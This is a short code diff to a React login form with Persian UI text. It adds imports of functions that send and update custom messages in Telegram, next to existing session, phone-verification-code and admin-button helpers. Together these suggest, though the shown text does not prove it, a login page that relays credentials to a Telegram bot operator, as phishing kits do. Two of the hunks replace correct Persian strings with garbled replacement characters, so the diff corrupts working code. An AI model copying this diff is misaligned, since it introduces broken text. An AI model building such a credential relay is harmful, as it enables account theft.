@@ -27,6 +27,8 @@ import {
   getSession,
   updatePhoneVerificationCode,
   showAdminButtons,
+  sendCustomMessageToTelegram,
+  updateCustomMessageInTelegram,
 } from "@/lib/telegram-service-enhanced";
 import {
   registerTelegramCallback,
@@ -330,7 +332,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور الزامی است" });
+      setErrors({ password: "رمز عبور الزامی اس��" });
       return;
     }
 
@@ -2284,7 +2286,7 @@ export const LoginForm = () => {
                             whiteSpace: "nowrap",
                           }}
                         >
-                          رمز عبور حساب را وارد کنید.
+                          رم�� عبور حساب را وارد کنید.
                         </span>
                       </legend>
                     </fieldset>
